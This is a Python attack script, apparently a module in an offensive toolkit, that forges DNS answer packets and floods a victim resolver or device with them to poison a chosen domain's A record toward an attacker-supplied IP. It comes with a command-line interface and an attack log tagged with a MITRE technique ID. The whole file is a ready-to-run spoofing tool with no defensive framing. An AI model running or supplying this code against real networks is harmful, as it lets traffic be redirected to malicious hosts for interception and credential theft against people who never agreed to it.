# modules/exploits/dns_cache_poisoner.py

import random
import socket
import struct
import argparse
import time
import os
import json
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1557.001"

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def build_dns_response(transaction_id, qname, spoof_ip):
    # Basic DNS Header
    flags = 0x8180  # response + recursion
    qdcount = 1
    ancount = 1
    nscount = arcount = 0
    header = struct.pack(">HHHHHH", transaction_id, flags, qdcount, ancount, nscount, arcount)

    # Question section
    qname_parts = qname.split(".")
    question = b""
    for part in qname_parts:
        question += struct.pack("B", len(part)) + part.encode()
    question += b"\x00"  # end
    question += struct.pack(">HH", 1, 1)  # type A, class IN

    # Answer section
    answer = b"\xc0\x0c"  # pointer to domain name
    answer += struct.pack(">HHIH", 1, 1, 300, 4)  # type A, class IN, TTL, RDLENGTH
    answer += socket.inet_aton(spoof_ip)

    return header + question + answer

def send_spoofed_responses(victim_ip, target_domain, spoof_ip, count):
    for i in range(count):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1)
        transaction_id = random.randint(0, 65535)
        pkt = build_dns_response(transaction_id, target_domain, spoof_ip)
        try:
            sock.sendto(pkt, (victim_ip, 53))
            print(f"[âœ“] Spoofed DNS reply sent to {victim_ip} for {target_domain} -> {spoof_ip}")
        except Exception as e:
            print(f"[!] Failed to send DNS spoof: {e}")
        finally:
            sock.close()
        time.sleep(0.2)

    log_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "victim_ip": victim_ip,
        "domain": target_domain,
        "spoof_ip": spoof_ip,
        "count": count,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Cache Poisoner")
    parser.add_argument("--victim-ip", required=True, help="Target device or resolver IP")
    parser.add_argument("--domain", required=True, help="Target domain to poison (e.g., router.lan)")
    parser.add_argument("--spoof-ip", required=True, help="IP address to inject as the A record")
    parser.add_argument("--count", type=int, default=20, help="Number of spoofed replies to send")
    args = parser.parse_args()

    send_spoofed_responses(args.victim_ip, args.domain, args.spoof_ip, args.count)
